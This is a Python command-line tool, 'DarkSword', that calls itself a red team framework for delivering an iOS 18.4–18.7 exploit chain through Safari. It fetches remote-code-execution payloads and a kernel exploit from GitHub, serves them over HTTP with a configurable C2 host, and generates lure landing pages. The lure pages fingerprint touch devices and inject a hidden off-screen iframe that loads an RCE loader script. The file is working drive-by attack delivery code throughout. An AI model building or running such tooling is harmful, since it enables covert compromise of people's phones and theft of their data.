"""DarkSword CLI - Red Team Exploit Chain Framework."""

import sys
from pathlib import Path
from typing import Optional

import click
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.markdown import Markdown

from . import __version__
from .config import ServeConfig, get_payloads_dir, get_templates_dir
from .server import run_server
from .payloads import sync_payloads, sync_kexploit, list_payloads, get_payload_info, RCE_PAYLOADS

console = Console()


def main():
    """Entry point for the CLI."""
    cli()


@click.group()
@click.version_option(version=__version__, prog_name="DarkSword")
def cli():
    """DarkSword - iOS Exploit Chain Red Team Framework.
    
    Ferramenta para entrega da cadeia de exploits DarkSword em operações de red team.
    Suporta iOS 18.4 - 18.7.
    """
    pass


@cli.command()
@click.option("-H", "--host", default="0.0.0.0", help="Host para escutar (0.0.0.0 = todas as interfaces)")
@click.option("-p", "--port", default=8080, type=int, help="Porta do servidor HTTP")
@click.option("--redirect", default=None, help="URL de redirecionamento após fallback")
@click.option("--c2-host", default=None, help="Host C2 para substituir no rce_loader.js (localHost)")
def serve(host: str, port: int, redirect: Optional[str], c2_host: Optional[str]):
    """Inicia o servidor HTTP para entrega da cadeia de exploits.
    
    Serve os payloads em payloads/ e templates em templates/.
    Os alvos iOS devem acessar a URL fornecida via Safari.
    """
    config = ServeConfig(
        host=host,
        port=port,
        redirect_url=redirect,
        custom_host_in_loader=c2_host,
    )

    if not list(get_payloads_dir().glob("*")):
        console.print("[yellow]Aviso: Diretório payloads/ vazio. Execute: darksword sync[/yellow]")
        console.print("[dim]Os arquivos serão servidos de templates/ se existirem.[/dim]\n")

    try:
        run_server(config)
    except OSError as e:
        if "Address already in use" in str(e) or "10048" in str(e):
            console.print(f"[red]Erro: Porta {port} já em uso. Use -p para outra porta.[/red]")
        else:
            raise
        sys.exit(1)


@cli.command()
@click.option("-f", "--force", is_flag=True, help="Sobrescrever arquivos existentes")
def sync(force: bool):
    """Sincroniza payloads do repositório DarkSword-RCE (GitHub).
    
    Baixa index.html, frame.html, rce_loader.js, rce_module*.js, rce_worker*.js, etc.
    """
    console.print("[bold]Sincronizando payloads DarkSword-RCE...[/bold]\n")
    results = sync_payloads(force=force)

    if results["success"]:
        console.print(f"[green][OK] Baixados:[/green] {', '.join(results['success'])}")
    if results["skipped"]:
        console.print(f"[dim][--] Ja existentes: {', '.join(results['skipped'])}[/dim]")
    if results["failed"]:
        for name, err in results["failed"]:
            console.print(f"[red][X] Falhou {name}: {err}[/red]")

    total = len(results["success"]) + len(results["skipped"]) + len(results["failed"])
    console.print(f"\n[bold]Total: {total} arquivos[/bold]")


@cli.command("sync-kexploit")
@click.option("-f", "--force", is_flag=True, help="Sobrescrever arquivos existentes")
def sync_kexploit_cmd(force: bool):
    """Sincroniza kernel exploit do opa334/darksword-kexploit (Objective-C).
    
    Makefile, src/main.m, entitlements.plist - compila no macOS com Xcode.
    """
    console.print("[bold]Sincronizando darksword-kexploit (opa334)...[/bold]\n")
    results = sync_kexploit(force=force)

    if results["success"]:
        console.print(f"[green][OK] Baixados:[/green] {', '.join(results['success'])}")
    if results["skipped"]:
        console.print(f"[dim][--] Ja existentes: {', '.join(results['skipped'])}[/dim]")
    if results["failed"]:
        for name, err in results["failed"]:
            console.print(f"[red][X] Falhou {name}: {err}[/red]")
    console.print("\n[dim]Compile com: cd kexploit && make (requer macOS, Xcode, SDK iOS)[/dim]")


@cli.command("list")
def list_cmd():
    """Lista payloads disponíveis no diretório local."""
    payloads = list_payloads()
    if not payloads:
        console.print("[yellow]Nenhum payload encontrado. Execute: darksword sync[/yellow]")
        return

    table = Table(title="Payloads Disponíveis")
    table.add_column("Arquivo", style="cyan")
    table.add_column("Tamanho", style="dim")
    table.add_column("Diretório", style="dim")

    for p in payloads:
        size = f"{p.stat().st_size:,} bytes" if p.is_file() else "(dir)"
        table.add_row(p.name, size, str(p.parent.name))
    console.print(table)


@cli.command()
def info():
    """Exibe informações sobre a cadeia DarkSword e CVEs."""
    info_data = get_payload_info()
    
    md = f"""
## {info_data['chain']}
{info_data['description']}

### Estágios da Cadeia
"""
    for stage, desc in info_data["stages"]:
        md += f"- **{stage}**: {desc}\n"

    md += f"\n### Versoes iOS Suportadas\n{', '.join(info_data['ios_versions'])}\n"
    if "not_in_repos" in info_data:
        md += "\n### Nao disponivel nos repos publicos\n" + "\n".join(f"- {x}" for x in info_data["not_in_repos"]) + "\n"
    md += "\n### Referencias\n" + "\n".join(f"- {r}" for r in info_data["references"])

    console.print(Panel(Markdown(md), title="DarkSword Info", border_style="blue"))


@cli.group()
def template():
    """Gerenciamento de templates de landing page."""
    pass


@template.command("generate")
@click.argument("name", default="landing")
@click.option("--title", default="Test Page", help="Título da página")
@click.option("--redirect", default=None, help="URL de redirecionamento se não for iOS")
def generate_template(name: str, title: str, redirect: Optional[str]):
    """Gera um template de landing page personalizado.
    
    Cria index.html e frame.html em templates/ para uso como isca.
    """
    templates_dir = get_templates_dir()
    
    index_html = f'''<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>{title}</title>
</head>
<body>
  <h1>{title}</h1>
  <p>Loading...</p>
  <script>
(function() {{
  if (!sessionStorage.getItem("uid") && ("ontouchstart" in window || navigator.maxTouchPoints > 0)) {{
    sessionStorage.setItem("uid", "1");
    const frame = document.createElement("iframe");
    frame.src = "frame.html?" + Math.random();
    frame.style.width = "1px";
    frame.style.opacity = "0.01";
    frame.style.position = "absolute";
    frame.style.left = "-9999px";
    frame.style.height = "1px";
    frame.style.border = "none";
    document.body.appendChild(frame);
  }} else {{
    top.location.href = "{redirect or "#"}";
  }}
}})();
  </script>
</body>
</html>'''

    frame_html = '''<!DOCTYPE html>
<html>
<head><title></title></head>
<body>
  <script type="text/javascript">
    document.write('<script defer="defer" src="rce_loader.js"><\\/script>');
  </script>
</body>
</html>'''

    index_path = templates_dir / f"{name}_index.html"
    frame_path = templates_dir / f"{name}_frame.html"
    
    index_path.write_text(index_html, encoding="utf-8")
    frame_path.write_text(frame_html, encoding="utf-8")
    
    console.print(f"[green][OK] Criados:[/green] {index_path}, {frame_path}")
    console.print("\n[dim]Para usar como index principal, copie para payloads/ ou renomeie.[/dim]")


@template.command("list")
def list_templates():
    """Lista templates disponíveis."""
    templates_dir = get_templates_dir()
    files = sorted(templates_dir.glob("*.html"))
    if not files:
        console.print("[dim]Nenhum template. Use: darksword template generate[/dim]")
        return
    for f in files:
        console.print(f"  {f.name}")


if __name__ == "__main__":
    main()
